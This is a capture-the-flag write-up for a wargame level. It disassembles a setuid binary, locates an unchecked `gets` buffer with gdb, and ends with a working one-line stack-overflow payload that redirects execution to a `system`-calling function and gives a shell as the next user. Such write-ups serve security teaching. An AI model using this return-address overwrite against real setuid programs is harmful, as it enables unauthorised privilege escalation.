### Description

Like last exercice we found a binary in home with the suid  execution bit set so we will probably have exploit the binary to get access to the shell or to the pass through it

So we will disassemble the program using objdump to have it in full

```sh
level1@RainFall:~$ objdump -d ./level1 
```

We can find 2 interesting element

first there is an unprotected input in the main: `gets` will try to write a string of any length to the stack.

- We can exploit the stack by overwriting the return adress of the stack base pointer. 

- By scrolling through the program's function we notice a function name run that actually launch a call to `system` function

```as
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp

[...]

 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    
```

---

- running gdb we can observe the stack with:
`(gdb) x/100x $sp`


- We can also have information on stack frame with:
```as
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048495 in main; saved eip 0x64636261
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c
```
- **Notice we got the current stack frame and the previous one in `saved eip 0x64636261`**

- We can stop the execution of the program right after the gets using the break "b \*0x8048495". it is right after the return of the gets function meaning we can observe the start of the string copied on the stack and calculate the offset to the saved eip (it is the address of the return function)

```bash
Starting program: /home/user/level1/level1 
aaaa

Breakpoint 1, 0x08048495 in main ()
(gdb) x/40x $sp
0xbffff6e0:	0xbffff6f0	0x0000002f	0xbffff73c	0xb7fd0ff4
0xbffff6f0:	0x61616161	0x08049700	0x00000001	0x08048321
0xbffff700:	0xb7fd13e4	0x00000016	0x0804978c	0x080484c1
0xbffff710:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff720:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
0xbffff730:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xb7fdc858
0xbffff750:	0x00000000	0xbffff71c	0xbffff7dc	0x00000000
0xbffff760:	0x08048230	0xb7fd0ff4	0x00000000	0x00000000
0xbffff770:	0x00000000	0xc319e73d	0xf45e432d	0x00000000
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args: 
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
(gdb) 
```

- we calculated that there is a distance of 80 Byte between start of input and saved *eip* meaning we need to input 76 Byte of filling string and then address of `run` function (make attention to endianess of system)



- We going to overwrite the return of main function to jump on the `run` function


```
level1@RainFall:~$ (python -c 'print ("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
```
